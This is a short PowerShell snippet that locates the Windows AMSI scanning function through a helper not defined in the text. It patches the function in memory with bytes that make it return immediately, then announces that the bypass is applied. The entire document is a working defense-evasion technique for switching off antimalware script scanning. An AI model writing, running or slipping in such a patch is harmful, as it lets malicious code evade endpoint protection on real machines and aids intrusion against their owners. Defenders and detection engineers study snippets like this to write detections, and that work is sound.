# Find the AMSI function pointer
$ptr = [Win32]::FindAmsiFun()
if ($ptr -eq 0) {
    Write-Host "protection not found"
    return
}

# Prepare 64-bit patch bytes: mov eax, 1 ; ret
$buf = [Byte[]](0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3)

# patch
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $buf.Length)
Write-Host "AMSI bypass applied"
